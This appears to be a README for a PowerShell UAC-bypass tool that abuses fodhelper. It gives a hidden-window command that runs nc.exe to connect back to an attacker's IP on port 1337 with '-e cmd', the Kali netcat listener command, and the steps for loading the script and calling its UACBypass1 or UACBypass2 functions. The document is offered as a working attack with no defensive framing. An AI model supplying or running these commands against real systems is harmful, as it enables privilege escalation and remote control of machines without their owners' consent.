# Bypass UAC 

Before importing the file, please edit the "**BypassUACfodhelper.ps1**" file in the following section:: 

```
$CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
```

### Execute:
```
kali@unix:/$ rlwrap nc -lvp 1337
```

```
Windows (Poweshell)> . .\BypassUACfodhelper.ps1
Windows (Poweshell)> UACBypass1
OR
Windows (Poweshell)> UACBypass2
```
